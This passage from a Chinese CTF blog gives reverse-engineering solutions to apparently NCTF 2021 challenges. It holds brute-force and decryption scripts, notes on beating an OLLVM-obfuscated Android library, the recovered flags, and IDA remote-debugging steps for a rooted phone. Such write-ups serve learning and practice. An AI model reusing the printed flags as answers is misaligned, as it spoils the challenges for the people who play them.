ds:dword_404E4Cxor eax, ds:dword_404E50 dword_404E4C = (flag[0] ^ 404E50 ) &amp; 0xFFmov byte ptr ds:dword_404E4C, almovzx ecx, byte ptr ds:dword_404E4Cand ecx, 0FFh dword_404E50 &gt;&gt;= 8mov byte ptr ds:dword_404E4C, clmov edx, ds:dword_404E50 dword_404E50 ^= dword_404A38[dword_404E4C * 4]shr edx, 8mov ds:dword_404E50, edxmovzx eax, byte ptr ds:dword_404E4Cmov ecx, ds:dword_404E50xor ecx, ds:dword_404A38[eax*4]mov ds:dword_404E50, ecxmov edx, ds:Imov al, [edx+4049F9h] # flag[1]mov byte ptr ds:dword_404E4C, almovzx ecx, byte ptr ds:dword_404E4Cxor ecx, ds:dword_404E50 404E4C = flag[1] ^ 404E50mov byte ptr ds:dword_404E4C, clmov edx, ds:dword_404E50 shr edx, 8 dword_404E50 &gt;&gt;= 8mov ds:dword_404E50, edxmovzx eax, byte ptr ds:dword_404E4Cmov ecx, ds:dword_404E50xor ecx, ds:dword_404A38[eax*4] dword_404E50 ^= dword_404A38[dword_404E4C * 4]mov ds:dword_404E50, ecxmov edx, ds:dword_404E50xor edx, 0FFFFFFFFhmov ds:dword_404E50, edx 分析完毕，把程序中加密后的flag提取出来直接爆破 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156#include &lt;stdio.h&gt;#include &lt;windows.h&gt;unsigned char byte_404A38[] =&#123; 0x00, 0x00, 0x00, 0x00, 0x96, 0x30, 0x07, 0x77, 0x2C, 0x61, 0x0E, 0xEE, 0xBA, 0x51, 0x09, 0x99, 0x19, 0xC4, 0x6D, 0x07, 0x8F, 0xF4, 0x6A, 0x70, 0x35, 0xA5, 0x63, 0xE9, 0xA3, 0x95, 0x64, 0x9E, 0x32, 0x88, 0xDB, 0x0E, 0xA4, 0xB8, 0xDC, 0x79, 0x1E, 0xE9, 0xD5, 0xE0, 0x88, 0xD9, 0xD2, 0x97, 0x2B, 0x4C, 0xB6, 0x09, 0xBD, 0x7C, 0xB1, 0x7E, 0x07, 0x2D, 0xB8, 0xE7, 0x91, 0x1D, 0xBF, 0x90, 0x64, 0x10, 0xB7, 0x1D, 0xF2, 0x20, 0xB0, 0x6A, 0x48, 0x71, 0xB9, 0xF3, 0xDE, 0x41, 0xBE, 0x84, 0x7D, 0xD4, 0xDA, 0x1A, 0xEB, 0xE4, 0xDD, 0x6D, 0x51, 0xB5, 0xD4, 0xF4, 0xC7, 0x85, 0xD3, 0x83, 0x56, 0x98, 0x6C, 0x13, 0xC0, 0xA8, 0x6B, 0x64, 0x7A, 0xF9, 0x62, 0xFD, 0xEC, 0xC9, 0x65, 0x8A, 0x4F, 0x5C, 0x01, 0x14, 0xD9, 0x6C, 0x06, 0x63, 0x63, 0x3D, 0x0F, 0xFA, 0xF5, 0x0D, 0x08, 0x8D, 0xC8, 0x20, 0x6E, 0x3B, 0x5E, 0x10, 0x69, 0x4C, 0xE4, 0x41, 0x60, 0xD5, 0x72, 0x71, 0x67, 0xA2, 0xD1, 0xE4, 0x03, 0x3C, 0x47, 0xD4, 0x04, 0x4B, 0xFD, 0x85, 0x0D, 0xD2, 0x6B, 0xB5, 0x0A, 0xA5, 0xFA, 0xA8, 0xB5, 0x35, 0x6C, 0x98, 0xB2, 0x42, 0xD6, 0xC9, 0xBB, 0xDB, 0x40, 0xF9, 0xBC, 0xAC, 0xE3, 0x6C, 0xD8, 0x32, 0x75, 0x5C, 0xDF, 0x45, 0xCF, 0x0D, 0xD6, 0xDC, 0x59, 0x3D, 0xD1, 0xAB, 0xAC, 0x30, 0xD9, 0x26, 0x3A, 0x00, 0xDE, 0x51, 0x80, 0x51, 0xD7, 0xC8, 0x16, 0x61, 0xD0, 0xBF, 0xB5, 0xF4, 0xB4, 0x21, 0x23, 0xC4, 0xB3, 0x56, 0x99, 0x95, 0xBA, 0xCF, 0x0F, 0xA5, 0xBD, 0xB8, 0x9E, 0xB8, 0x02, 0x28, 0x08, 0x88, 0x05, 0x5F, 0xB2, 0xD9, 0x0C, 0xC6, 0x24, 0xE9, 0x0B, 0xB1, 0x87, 0x7C, 0x6F, 0x2F, 0x11, 0x4C, 0x68, 0x58, 0xAB, 0x1D, 0x61, 0xC1, 0x3D, 0x2D, 0x66, 0xB6, 0x90, 0x41, 0xDC, 0x76, 0x06, 0x71, 0xDB, 0x01, 0xBC, 0x20, 0xD2, 0x98, 0x2A, 0x10, 0xD5, 0xEF, 0x89, 0x85, 0xB1, 0x71, 0x1F, 0xB5, 0xB6, 0x06, 0xA5, 0xE4, 0xBF, 0x9F, 0x33, 0xD4, 0xB8, 0xE8, 0xA2, 0xC9, 0x07, 0x78, 0x34, 0xF9, 0x00, 0x0F, 0x8E, 0xA8, 0x09, 0x96, 0x18, 0x98, 0x0E, 0xE1, 0xBB, 0x0D, 0x6A, 0x7F, 0x2D, 0x3D, 0x6D, 0x08, 0x97, 0x6C, 0x64, 0x91, 0x01, 0x5C, 0x63, 0xE6, 0xF4, 0x51, 0x6B, 0x6B, 0x62, 0x61, 0x6C, 0x1C, 0xD8, 0x30, 0x65, 0x85, 0x4E, 0x00, 0x62, 0xF2, 0xED, 0x95, 0x06, 0x6C, 0x7B, 0xA5, 0x01, 0x1B, 0xC1, 0xF4, 0x08, 0x82, 0x57, 0xC4, 0x0F, 0xF5, 0xC6, 0xD9, 0xB0, 0x65, 0x50, 0xE9, 0xB7, 0x12, 0xEA, 0xB8, 0xBE, 0x8B, 0x7C, 0x88, 0xB9, 0xFC, 0xDF, 0x1D, 0xDD, 0x62, 0x49, 0x2D, 0xDA, 0x15, 0xF3, 0x7C, 0xD3, 0x8C, 0x65, 0x4C, 0xD4, 0xFB, 0x58, 0x61, 0xB2, 0x4D, 0xCE, 0x51, 0xB5, 0x3A, 0x74, 0x00, 0xBC, 0xA3, 0xE2, 0x30, 0xBB, 0xD4, 0x41, 0xA5, 0xDF, 0x4A, 0xD7, 0x95, 0xD8, 0x3D, 0x6D, 0xC4, 0xD1, 0xA4, 0xFB, 0xF4, 0xD6, 0xD3, 0x6A, 0xE9, 0x69, 0x43, 0xFC, 0xD9, 0x6E, 0x34, 0x46, 0x88, 0x67, 0xAD, 0xD0, 0xB8, 0x60, 0xDA, 0x73, 0x2D, 0x04, 0x44, 0xE5, 0x1D, 0x03, 0x33, 0x5F, 0x4C, 0x0A, 0xAA, 0xC9, 0x7C, 0x0D, 0xDD, 0x3C, 0x71, 0x05, 0x50, 0xAA, 0x41, 0x02, 0x27, 0x10, 0x10, 0x0B, 0xBE, 0x86, 0x20, 0x0C, 0xC9, 0x25, 0xB5, 0x68, 0x57, 0xB3, 0x85, 0x6F, 0x20, 0x09, 0xD4, 0x66, 0xB9, 0x9F, 0xE4, 0x61, 0xCE, 0x0E, 0xF9, 0xDE, 0x5E, 0x98, 0xC9, 0xD9, 0x29, 0x22, 0x98, 0xD0, 0xB0, 0xB4, 0xA8, 0xD7, 0xC7, 0x17, 0x3D, 0xB3, 0x59, 0x81, 0x0D, 0xB4, 0x2E, 0x3B, 0x5C, 0xBD, 0xB7, 0xAD, 0x6C, 0xBA, 0xC0, 0x20, 0x83, 0xB8, 0xED, 0xB6, 0xB3, 0xBF, 0x9A, 0x0C, 0xE2, 0xB6, 0x03, 0x9A, 0xD2, 0xB1, 0x74, 0x39, 0x47, 0xD5, 0xEA, 0xAF, 0x77, 0xD2, 0x9D, 0x15, 0x26, 0xDB, 0x04, 0x83, 0x16, 0xDC, 0x73, 0x12, 0x0B, 0x63, 0xE3, 0x84, 0x3B, 0x64, 0x94, 0x3E, 0x6A, 0x6D, 0x0D, 0xA8, 0x5A, 0x6A, 0x7A, 0x0B, 0xCF, 0x0E, 0xE4, 0x9D, 0xFF, 0x09, 0x93, 0x27, 0xAE, 0x00, 0x0A, 0xB1, 0x9E, 0x07, 0x7D, 0x44, 0x93, 0x0F, 0xF0, 0xD2, 0xA3, 0x08, 0x87, 0x68, 0xF2, 0x01, 0x1E, 0xFE, 0xC2, 0x06, 0x69, 0x5D, 0x57, 0x62, 0xF7, 0xCB, 0x67, 0x65, 0x80, 0x71, 0x36, 0x6C, 0x19, 0xE7, 0x06, 0x6B, 0x6E, 0x76, 0x1B, 0xD4, 0xFE, 0xE0, 0x2B, 0xD3, 0x89, 0x5A, 0x7A, 0xDA, 0x10, 0xCC, 0x4A, 0xDD, 0x67, 0x6F, 0xDF, 0xB9, 0xF9, 0xF9, 0xEF, 0xBE, 0x8E, 0x43, 0xBE, 0xB7, 0x17, 0xD5, 0x8E, 0xB0, 0x60, 0xE8, 0xA3, 0xD6, 0xD6, 0x7E, 0x93, 0xD1, 0xA1, 0xC4, 0xC2, 0xD8, 0x38, 0x52, 0xF2, 0xDF, 0x4F, 0xF1, 0x67, 0xBB, 0xD1, 0x67, 0x57, 0xBC, 0xA6, 0xDD, 0x06, 0xB5, 0x3F, 0x4B, 0x36, 0xB2, 0x48, 0xDA, 0x2B, 0x0D, 0xD8, 0x4C, 0x1B, 0x0A, 0xAF, 0xF6, 0x4A, 0x03, 0x36, 0x60, 0x7A, 0x04, 0x41, 0xC3, 0xEF, 0x60, 0xDF, 0x55, 0xDF, 0x67, 0xA8, 0xEF, 0x8E, 0x6E, 0x31, 0x79, 0xBE, 0x69, 0x46, 0x8C, 0xB3, 0x61, 0xCB, 0x1A, 0x83, 0x66, 0xBC, 0xA0, 0xD2, 0x6F, 0x25, 0x36, 0xE2, 0x68, 0x52, 0x95, 0x77, 0x0C, 0xCC, 0x03, 0x47, 0x0B, 0xBB, 0xB9, 0x16, 0x02, 0x22, 0x2F, 0x26, 0x05, 0x55, 0xBE, 0x3B, 0xBA, 0xC5, 0x28, 0x0B, 0xBD, 0xB2, 0x92, 0x5A, 0xB4, 0x2B, 0x04, 0x6A, 0xB3, 0x5C, 0xA7, 0xFF, 0xD7, 0xC2, 0x31, 0xCF, 0xD0, 0xB5, 0x8B, 0x9E, 0xD9, 0x2C, 0x1D, 0xAE, 0xDE, 0x5B, 0xB0, 0xC2, 0x64, 0x9B, 0x26, 0xF2, 0x63, 0xEC, 0x9C, 0xA3, 0x6A, 0x75, 0x0A, 0x93, 0x6D, 0x02, 0xA9, 0x06, 0x09, 0x9C, 0x3F, 0x36, 0x0E, 0xEB, 0x85, 0x67, 0x07, 0x72, 0x13, 0x57, 0x00, 0x05, 0x82, 0x4A, 0xBF, 0x95, 0x14, 0x7A, 0xB8, 0xE2, 0xAE, 0x2B, 0xB1, 0x7B, 0x38, 0x1B, 0xB6, 0x0C, 0x9B, 0x8E, 0xD2, 0x92, 0x0D, 0xBE, 0xD5, 0xE5, 0xB7, 0xEF, 0xDC, 0x7C, 0x21, 0xDF, 0xDB, 0x0B, 0xD4, 0xD2, 0xD3, 0x86, 0x42, 0xE2, 0xD4, 0xF1, 0xF8, 0xB3, 0xDD, 0x68, 0x6E, 0x83, 0xDA, 0x1F, 0xCD, 0x16, 0xBE, 0x81, 0x5B, 0x26, 0xB9, 0xF6, 0xE1, 0x77, 0xB0, 0x6F, 0x77, 0x47, 0xB7, 0x18, 0xE6, 0x5A, 0x08, 0x88, 0x70, 0x6A, 0x0F, 0xFF, 0xCA, 0x3B, 0x06, 0x66, 0x5C, 0x0B, 0x01, 0x11, 0xFF, 0x9E, 0x65, 0x8F, 0x69, 0xAE, 0x62, 0xF8, 0xD3, 0xFF, 0x6B, 0x61, 0x45, 0xCF, 0x6C, 0x16, 0x78, 0xE2, 0x0A, 0xA0, 0xEE, 0xD2, 0x0D, 0xD7, 0x54, 0x83, 0x04, 0x4E, 0xC2, 0xB3, 0x03, 0x39, 0x61, 0x26, 0x67, 0xA7, 0xF7, 0x16, 0x60, 0xD0, 0x4D, 0x47, 0x69, 0x49, 0xDB, 0x77, 0x6E, 0x3E, 0x4A, 0x6A, 0xD1, 0xAE, 0xDC, 0x5A, 0xD6, 0xD9, 0x66, 0x0B, 0xDF, 0x40, 0xF0, 0x3B, 0xD8, 0x37, 0x53, 0xAE, 0xBC, 0xA9, 0xC5, 0x9E, 0xBB, 0xDE, 0x7F, 0xCF, 0xB2, 0x47, 0xE9, 0xFF, 0xB5, 0x30, 0x1C, 0xF2, 0xBD, 0xBD, 0x8A, 0xC2, 0xBA, 0xCA, 0x30, 0x93, 0xB3, 0x53, 0xA6, 0xA3, 0xB4, 0x24, 0x05, 0x36, 0xD0, 0xBA, 0x93, 0x06, 0xD7, 0xCD, 0x29, 0x57, 0xDE, 0x54, 0xBF, 0x67, 0xD9, 0x23, 0x2E, 0x7A, 0x66, 0xB3, 0xB8, 0x4A, 0x61, 0xC4, 0x02, 0x1B, 0x68, 0x5D, 0x94, 0x2B, 0x6F, 0x2A, 0x37, 0xBE, 0x0B, 0xB4, 0xA1, 0x8E, 0x0C, 0xC3, 0x1B, 0xDF, 0x05, 0x5A, 0x8D, 0xEF, 0x02, 0x2D&#125;;unsigned char compare[] = &#123; 0x5E, 0x60, 0xF6, 0xC0, 0x0A, 0x6E, 0xB1, 0x00, 0xD2, 0xA2, 0x19, 0x33, 0xB7, 0xB7, 0xCA, 0x57, 0x9C, 0x6D, 0x64, 0x9A, 0x26, 0x27, 0xD8, 0xBD, 0x91, 0xFB, 0x38, 0xD8, 0xB3, 0x0B, 0xE1, 0x8D, 0xAD, 0x0D, 0x6B, 0x17, 0xEF, 0xDE, 0x5F, 0x68, 0xB1, 0xF7, 0x1F, 0x2C, 0x96, 0x42, 0x44, 0x6C, 0x90, 0xFE, 0x5C, 0xA1, 0x21, 0x87, 0xCD, 0x20, 0xE8, 0x7C, 0x96, 0x62, 0xFD, 0x41, 0x16, 0x2C, 0x9A, 0x0F, 0x2D, 0x57, 0x2C, 0xDC, 0x52, 0xAE, 0xCF, 0x7D, 0x49, 0x50, 0x4A, 0xBF, 0x6A, 0xFF&#125;;int main() &#123; DWORD* dword_404A38 = (DWORD*)byte_404A38; DWORD* dwcompare = (DWORD*)compare; char flag[40] = &#123;0&#125;; for (int k = 0; k &lt; 40; k+=2) &#123; for (int i = 32; i &lt; 128; i++) &#123; for (int j = 32; j &lt; 128; j++) &#123; flag[0] = i; flag[1] = j; DWORD dword_404E50 = 0xFFFFFFFF; DWORD dword_404E4C = (flag[0] ^ dword_404E50) &amp; 0xFF; dword_404E50 &gt;&gt;= 8; dword_404E50 ^= dword_404A38[dword_404E4C]; dword_404E4C = (flag[1] ^ dword_404E50) &amp; 0Xff; dword_404E50 &gt;&gt;= 8; dword_404E50 ^= dword_404A38[dword_404E4C]; dword_404E50 = 0xFFFFFFFF - dword_404E50; if (dword_404E50 == dwcompare[k/2]) &#123; printf(&quot;%c%c&quot;, i, j); &#125; &#125; &#125; &#125; return 0;&#125; flag为 NCTF&#123;rLdE57TG0iHA39qUnFZp6LeJyYEBcxMNL7&#125; 狗狗的秘密 前面是47进制，直接用C语言实现上面那个框中的算法，调试，输几个数试试就能试出来了 先写脚本从下往上把47进制后的flag弄出来，发现有很多种情况 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253byte_405018 = [ 0x21, 0x43, 0x65, 0x87, 0x09, 0x21, 0x43, 0x65, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC]byte_405118 = [ 0xA7, 0x1C, 0x7E, 0xAF, 0xD9, 0xC2, 0xC0, 0xBE, 0x1F, 0x45, 0x9A, 0x85, 0x26, 0xE3, 0x87, 0xC3, 0x21, 0xE0, 0x95, 0x10, 0x71, 0x70, 0x02, 0x75, 0x35, 0xA5, 0x1D, 0x0D, 0x2F, 0xEE, 0x25, 0x7B, 0xB5, 0x82, 0x66, 0x8D, 0xDB, 0x53, 0x3A, 0x29, 0xD4, 0x43, 0x99, 0x97, 0x9D, 0xE8, 0x49, 0x00]byte_v17 = [0x52, 0xC3, 0x1A, 0xE0, 0x16, 0x5D, 0x5E, 0xE2, 0x67, 0x1F, 0x1F, 0x06, 0x06, 0x1F, 0x17, 0x06, 0x0F, 0xF9, 0x06, 0x67, 0x58, 0xB2, 0xE2, 0x8C, 0x0F, 0x2A, 0x06, 0x89, 0xCF, 0x2A, 0x06, 0x1F, 0x98, 0x1A, 0x3E, 0x17, 0x67, 0x1F, 0xF7, 0x3A, 0x44, 0xC3, 0x16, 0x33, 0x69, 0x1A, 0x75, 0x16, 0x3E, 0x17, 0xD5, 0x69, 0x7A, 0x1B, 0x44, 0x44, 0x3E, 0x67, 0xF7, 0x89, 0x67]v11 = []for v17 in byte_v17: for i in range(256): c = byte_405018[i] ^ i if c == v17: # print(hex(i)) if i in byte_405118: print(byte_405118.index(i), end=&quot; &quot;) print(&quot;&quot;) 索引为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960612 0 33 45 44 30 40 8 2322 11 737 3437 3419 20 4319 20 4337 342419 20 4331 42919 20 4322 11 7135234131 43519 20 439143519 20 4337 34333 45102422 11 737 343812503064233 45363010242142262825251022 11 738922 11 7 然后写脚本，从一头开始试，因为如果一头稍微一改，打印的字符串前面变化很大的话，说明改对了，因为数据高位一改，整个数字变化才大，然后long_to_bytes后对应的字符也变换很大了，如果从低位改，数据变化不大，long_to_bytes后头部的字符变化也不大了， 就这样一点点改，flag就一点点的显示出来了 可能描述的有点抽象，举个例子就很容易懂了 对应的解密脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from Crypto.Util.number import *compare = [2, 0, 45, 44, 30, 40, 8, 23, 11, 37, 34, 43, 43, 37, 24, 19, 4, 29, 19, # 19 20 43 22, # 22 11 7 13, 5, 23, 41, 4, # 31 4 35, 20, # 19 20 43 9, 14, 35, 43, # 19 20 43 37, # 37 34 3, 33, # 33 45 10, 24, 22, # 22 11 7 37, # 37 34 38, 1, 25, 0, 30, 6, 42, 45, # 33 45 36, 30, 10, 24, 21, 42, 26, 28, 25, 25, 10, 7, 38, 9, 11]sum = 0re_compare = compare[::-1]for i in range(len(compare)): tmp = re_compare[i] * pow(47, i) sum += tmpprint(long_to_bytes(sum))# NCTF&#123;ADF0E239-D911-3781-7E40-A575A19E5835&#125; flag为 NCTF&#123;ADF0E239-D911-3781-7E40-A575A19E5835&#125; easy_mobileJEB打开分析 发现check_flag 的算法在对应的so文件里 IDA打开找到 Java_com_example_rectf_MainActivity_checkflag 函数 哇塞，看这优美的图形，是OLLVM，从网上找来各种脚本平坦化，要么是失败，要么是去了还不如不去容易看 我一共试了这2个脚本 https://github.com/cq674350529/deflat （成功去除，基址设置为0X400000，比如check_flag是0X7900，然后 就运行 python deflat.py -f libnative-lib.so --addr 0x407900，但是去了后我感觉更难看了） https://github.com/pcy190/deobfuscator （这个我去除失败，可能是qiling版本的问题） 好吧，直接硬刚OLLVM，真机调试 如何搭建真机调试环境可以参考我写的这篇文章 https://zzzzsky.com/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/ 在下面每个框中第一条指令下断点，尤其是这种大的块肯定是有用的，先审视一下这种大的块 发现在这个位置调用了strlen，然后与0X18对比 猜测是验证flag的长度，继续审视其他块 在这个位置发现了一些类似密钥的字符串，还调用了一个函数，进入这个 sub_7D30F1E260 函数 根据&lt;&lt; 4 &gt;&gt;5 0X12345678等特征，发现这是一种个TEA算法，delta改为了0X12345678 继续审视，在这个位置发现了一些明文 F5，发现这里还有一些加减乘除的一些操作 开始调试，直接在上面对应的位置下断点，flag先输入12345试试，一点点来到strlen的位置，发现果然是验证flag的长度 继续F9，发现即没有到达加减乘除那个块，也没有到达TEA算法那里就显示NO了，我么输入flag为 123456789012345678901234 好，程序断在了加减乘除那个块那里，直接一点点单步调试 在mul之前停下，观察寄存器，发现X1指向的是最后8个字符，然后来到X16寄存器指向的内存位置，稍微整理整理 发现系统初始化了16个字符 PRST0123789: &quot;#$ ，然后下面紧跟着flag 的前16位，猜测flag是分开验证的16 + 8 跳过乘法，再看内存 最终调试到memcpy的位置 dword_7CD3B3E14C 处的数据为 而刚才0007FD020C630处的数据已经变为了 于是猜测是flag的前16位根据PRST0123789: &quot;#$ 加减乘除后 与dword_7CD3B3E14C进行对比，然后flag 的后8位是那个tea算法 这里一点点调试，发现 1234[&#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1687, 1824, 1912, 2002][&#x27;9&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;] * [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;] + [&#x27;P&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;] = [2816, 2434, 2533, 2634][&#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1751, 1892, 1982, 2074][&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1623, 1756, 1842, 1930] 写脚本解密得到flag的前16个字符 12345678910111213141516171819202122232425262728293031323334a = [3287, 1688, 3452, 1786, 3255, 1994, 1947, 2002, 2384, 2777, 2783, 5286, 3319, 1824, 1842, 2038] mul1 = [ord(i) for i in &quot;0123&quot;]mul2 = [ord(i) for i in &#x27; &quot;#$&#x27;]add1 = [ord(i) for i in &quot;PRST&quot;]add2 = [ord(i) for i in &quot;789:&quot;]flag = []flag1 = [(a[:4][i]-add2[i])/mul2[i] for i in range(4)]flag2 = [(a[4:8][i]-add2[i])/mul2[i] for i in range(4)]flag3 = [(a[8:12][i]-add1[i])/mul1[i] for i in range(4)]flag4 = [(a[12:][i]-add2[i])/mul2[i] for i in range(4)]print(flag1)print(flag2)print(flag3)print(flag4)flag = flag1 + flag2 + flag3 + flag4flag = [chr(int(i)) for i in flag]print(&quot;&quot;.join(flag))# [101.0, 48.0, 97.0, 48.0]# [100.0, 57.0, 54.0, 54.0]# [48.0, 55.0, 54.0, 102.0]# [102.0, 52.0, 51.0, 55.0]# e0a0d966076ff437 然后flag输入e0a0d966076ff437ABCD1234重新调试，果然程序断在了TEA算法的位置 发现果然是对flag的后8个字符进行TEA加密，直接运行到加密完成 然后进入汇编界面单步调试，注意CMP指令 可以发现V0加密后应改为0XC65AEDA, 这里修改X13的值为0XC65AEDA,使其验证通过，然后再单步 运行到这个位置，发现V1加密后的数据为 0xADBF8DB1 直接写脚本解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt; #include &lt;stdint.h&gt; //加密函数 void encrypt(uint32_t* v, uint32_t* k) &#123; uint32_t v0 = v[0], v1 = v[1], sum = 0, i; uint32_t delta = 0x12345678; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) &#123; sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); &#125; v[0] = v0; v[1] = v1;&#125;//解密函数 void decrypt(uint32_t* v, uint32_t* k) &#123; uint32_t delta = 0x12345678; uint32_t v0 = v[0], v1 = v[1], sum = delta * 32, i; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125;unsigned char byte_key[] =&#123; 0x71, 0x69, 0x68, 0x61, 0x68, 0x61, 0x69, 0x6E, 0x69, 0x6E, 0x61, 0x6E, 0x61, 0x6E, 0x61, 0x6D&#125;;//char enc[] = &#123; &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27; &#125;;int main()&#123; //uint32_t* v = (uint32_t*)enc; uint32_t v[2] = &#123; 0x000000000C65AEDA , 0x00000000ADBF8DB1 &#125;; uint32_t* k = (uint32_t*)byte_key; decrypt(v, k); printf(&quot;解密后的数据：%u %u\\n&quot;, v[0], v[1]); return 0;&#125; 后8位是 58af2715 拼凑得到 flag e0a0d966076ff43758af2715 验证成功 纪念AK RE, 拿了3一血，美滋滋 继续加油~~ 题目附件链接：https://pan.baidu.com/s/1FaBD6_FDjKLziKpVqvGe-Q提取码：ptjq","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"},{"name":"ollvm","slug":"ollvm","permalink":"https://zzzzsky.github.io/tags/ollvm/"}]},{"title":"IDA真机调试安卓so文件","slug":"IDA真机调试安卓so文件","date":"2021-11-29T05:03:23.000Z","updated":"2021-11-29T11:44:31.569Z","comments":true,"path":"2021/11/29/IDA真机调试安卓so文件/","link":"","permalink":"https://zzzzsky.github.io/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/","excerpt":"","text":"IDA真机调试安卓so文件简要看了网上很多的IDA真机调试安卓的文章，感觉很多步骤没有必要，这里整理一下最简单的实现安卓真机调试的步骤，以便以后参考，以 2021NCTF easy_mobile题目举例 步骤 首先需要一个root 后的手机，用数据线连接电脑，并且开启USB调试 电脑安装好 adb 运行adb devices 观察设备是否已经连接 来到IDA安装目录的文件夹，将 用adb push 电脑源目录 安卓的目的目录 将 dbgsrv对应的文件放到手机文件的某个目录下 运行adb shell 然后su 切换到root权限，来到对应的目录下 给 android_server 和 android_server64加可执行权限 观察此题check_flag函数在libnative-lib.so文件中，为arm64架构 运行对应的server, 这里运行的是./android_server64 端口转发adb forward tcp:23946 tcp:23946 打开IDA，拖入对应的so文件，选择Remote ARM Linux/Android debugger 11、Debugger -&gt; Process options,填写localhost，端口保持默认 12、对应的手机上安装对应的APK文件 13、IDA Debugger -&gt; Attach to process, 选择对应的进程 14、在Java_com_example_rectf_MainActivity_checkflag 函数那里下断点，手机输入flag，点验证，IDA断下 